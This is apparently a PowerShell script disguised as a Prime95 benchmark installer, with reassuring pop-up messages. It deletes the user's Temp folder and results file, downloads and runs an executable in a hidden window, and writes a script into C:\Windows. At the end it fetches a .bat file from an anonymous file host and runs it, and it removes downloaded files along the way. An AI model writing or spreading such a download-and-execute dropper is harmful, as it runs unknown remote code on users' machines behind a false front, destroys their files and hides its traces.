Remove-Item -Path "$env:Temp\*" -Force -Recurse
Remove-Item -Path "$env:UserProfile\desktop\results.txt" -Force

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show('DOWNLOADING "Prime95"', 'Installation In Progress', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information)
Invoke-WebRequest -Uri "https://github.com/Metr0211/D/raw/main/Prime.zip" -OutFile "$env:UserProfile\AppData\Local\Temp\Prime.zip"

Expand-Archive -Path "$env:UserProfile\AppData\Local\Temp\Prime.zip" -DestinationPath "$env:UserProfile\AppData\Local\Temp\"

Start-Process -FilePath "$env:UserProfile\AppData\Local\Temp\prime95.exe" -WindowStyle Hidden

Remove-Item -Path "$env:UserProfile\AppData\Local\Temp\Prime.zip" -Force
Remove-Item -Path "$env:UserProfile\AppData\Local\Temp\Prime" -Force -Recurse

[System.Windows.Forms.MessageBox]::Show('Prime95 has been successfully installed.', 'Installation Complete', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information)

Remove-Item -Path "C:\Windows\bench.ps1" -Force
Remove-Item -Path "$env:UserProfile\AppData\Local\Temp\bench.ps1" -Force
Remove-Item -Path "$env:UserProfile\AppData\Local\Temp\powershell.lnk" -Force

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Metr0211/D/main/powershell.lnk" -OutFile "$env:UserProfile\AppData\Local\Temp\powershell.lnk"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Metr0211/D/main/bench.ps1" -OutFile "C:\Windows\bench.ps1"

Write-Output "CD .."
Write-Output "CD .."
Write-Output "CD .."
Write-Output ".\Bench.ps1"
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show('Copy The Text And Drag On "PS1 File" "', 'TimerUI', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information)

Start-Process -FilePath "$env:UserProfile\AppData\Local\Temp\powershell.lnk"

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show('Starting testing phase: Graphic Results.txt', 'TimerUI', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information)

Start-Process -FilePath "https://chart-studio.plotly.com/create/#/"

cls

Invoke-WebRequest -Uri "https://files.catbox.moe/jjdqte.bat" -OutFile "$env:UserProfile\AppData\Local\Temp\jjdqte.bat"
Start-Process -FilePath "$env:UserProfile\AppData\Local\Temp\jjdqte.bat"

exit

